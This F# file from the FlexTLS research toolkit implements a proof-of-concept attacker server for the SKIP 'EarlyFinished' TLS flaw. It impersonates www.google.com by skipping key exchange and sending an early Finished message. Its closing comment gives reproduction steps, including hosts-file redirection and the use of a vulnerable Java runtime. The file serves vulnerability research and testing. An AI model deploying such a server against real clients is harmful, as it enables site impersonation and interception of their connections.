(*
 * Copyright 2015 INRIA and Microsoft Corporation
 * 
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 * 
 *     http://www.apache.org/licenses/LICENSE-2.0
 * 
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *)

#light "off"

module FlexApps.Attack_SKIP_EarlyFinished

open Bytes
open TLSInfo
open TLSConstants

open FlexTLS
open FlexTypes
open FlexConstants
open FlexConnection
open FlexClientHello
open FlexServerHello
open FlexCertificate
open FlexFinished
open FlexSecrets
open FlexAppData

type Attack_SKIP_EarlyFinished =
    class

    static member server (listening_address:string, ?port:int) : unit =
        // Genuine www.google.com certificate chain
        let g1 = new System.Security.Cryptography.X509Certificates.X509Certificate2("google.com-1.crt") in
        let g2 = new System.Security.Cryptography.X509Certificates.X509Certificate2("google.com-2.crt") in 
        let g3 = new System.Security.Cryptography.X509Certificates.X509Certificate2("google.com-3.crt") in
        let chain = (List.map (fun c -> Bytes.abytes c) [g1.RawData; g2.RawData; g3.RawData]) in

        let port  = defaultArg port FlexConstants.defaultTCPPort in

        while true do
            // Accept TCP connection from the client
            let st,cfg = FlexConnection.serverOpenTcpConnection(listening_address, listening_address, port) in

            // Start RSA key exchange
            let st,nsc,fch  = FlexClientHello.receive(st) in
            let fsh         = { FlexConstants.nullFServerHello with ciphersuite = Some(TLSConstants.TLS_DHE_RSA_WITH_AES_128_CBC_SHA)} in
            let st,nsc,fsh  = FlexServerHello.send(st,fch,nsc,fsh) in
            let st, nsc, fc = FlexCertificate.send(st, Server, chain, nsc) in
            let verify_data = FlexSecrets.makeVerifyData nsc.si (abytes [||]) Server st.hs_log in

            // Skip key exchange messages and send Finished
            let st,fin = FlexFinished.send(st,verify_data=verify_data) in
            let st     = FlexAppData.send(st,"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 61\r\n\r\n\x1b[31;47mYou are vulnerable to the EarlyFinished attack!\x1b[0m\r\n") in
            Tcp.close st.ns
        done

    end

    (*
  
  - Download and install jdk-8-windows-x64.exe from http://www.oracle.com/technetwork/java/javase/downloads/java-archive-javase8-2177648.html
This version is vulnerable to SKIP

- Download and install e.g. jre-8u71-windows-x64 from http://www.oracle.com/technetwork/java/javase/downloads/java-archive-javase8-2177648.html
This version is patched for SKIP

- In a bash terminal, set
$ alias java-1.8.0="/cygdrive/c/Program\ Files/Java/jdk1.8.0/jre/bin/java.exe"
$ alias javac="/cygdrive/c/Program\ Files/Java/jdk1.8.0/bin/javac.exe"

- From ~/mitls-flex/flex/FlexApps/
$ javac client.java

- Check that with a vulnerable version, we get www.google.com webpage (from ~/mitls-flex/flex/FlexApps/)
$ java-1.8.0 client https://www.google.com
<html>...

- In a PowerShell as admin,
> echo '127.0.0.1 www.google.com' > .\drivers\etc\hosts

- Start flexTLS server attacker, from folder with google.com chain: ~/mitls-flex/tests/pki/rsa/certificates
$ ~/mitls-flex/flex/FlexApps/bin/Release/FlexApps.exe -s efin --accept 127.0.0.1

- Run Java client using vulnerable JRE (from ~/mitls-flex/flex/FlexApps/)
$ java-1.8.0 client https://www.google.com
You are vulnerable to the EarlyFinished attack!

- Check that the patched version is not vulnerable
$ java client
Exception in thread "main" javax.net.ssl.SSLHandshakeException: Received Finished message before ChangeCipherSpec
...

- Reset hosts file from PowerShell as admin
> echo '#127.0.0.1 www.google.com' > .\drivers\etc\hosts
    
    *)